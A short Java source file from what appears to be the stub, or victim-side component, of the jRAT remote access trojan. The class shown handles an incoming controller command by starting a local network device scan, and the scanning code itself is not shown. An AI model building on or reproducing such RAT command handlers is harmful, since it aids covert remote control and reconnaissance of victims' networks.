package se.jrat.stub.packets.incoming;

import se.jrat.stub.Connection;
import se.jrat.stub.Lan;

public class Packet71LocalNetworkDevices extends AbstractIncomingPacket {

	@Override
	public void read(Connection con) throws Exception {
		new Lan().start();
	}

}
